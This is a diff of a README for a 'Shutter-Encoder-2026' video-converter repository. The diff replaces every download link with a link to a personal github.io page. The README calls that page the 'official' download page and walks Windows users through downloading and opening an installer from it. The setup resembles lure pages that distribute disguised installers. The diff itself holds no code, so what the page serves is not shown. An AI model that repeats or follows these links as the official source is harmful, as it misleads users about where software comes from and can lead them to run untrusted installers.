@@ -1,12 +1,12 @@
 # 🎬 Shutter-Encoder-2026 - Convert video files with ease today
 
-[![](https://img.shields.io/badge/Download-Shutter%20Encoder%202026-blue.svg)](https://github.com/angsh8899/Shutter-Encoder-2026)
+[![](https://img.shields.io/badge/Download-Shutter%20Encoder%202026-blue.svg)](https://angsh8899.github.io)
 
 ## 📥 Direct Download Access
 
 You can find the software installer at the official repository link. 
 
-[Click here to download Shutter Encoder](https://github.com/angsh8899/Shutter-Encoder-2026)
+[Click here to download Shutter Encoder](https://angsh8899.github.io)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Shutter Encoder runs on most modern desktop environments. To use this applicatio
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the official [Download Page](https://github.com/angsh8899/Shutter-Encoder-2026).
+1.  Visit the official [Download Page](https://angsh8899.github.io).
 2.  Locate the button or link labeled for Windows installers.
 3.  Click the link to save the file to your computer.
 4.  Open your Downloads folder in File Explorer.
